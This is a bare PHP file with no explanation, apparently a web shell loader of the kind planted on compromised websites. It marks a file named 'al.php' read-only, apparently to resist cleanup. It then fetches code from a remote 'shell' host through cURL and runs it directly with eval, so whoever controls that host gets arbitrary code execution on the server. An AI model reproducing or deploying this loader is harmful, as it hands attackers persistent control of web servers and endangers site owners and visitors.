<?php
$file = 'al.php';
chmod($file, 0444);
?>
<?php
$remoteUrl = "https://shell.prinsh.com/Nathan/alfa.txt";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
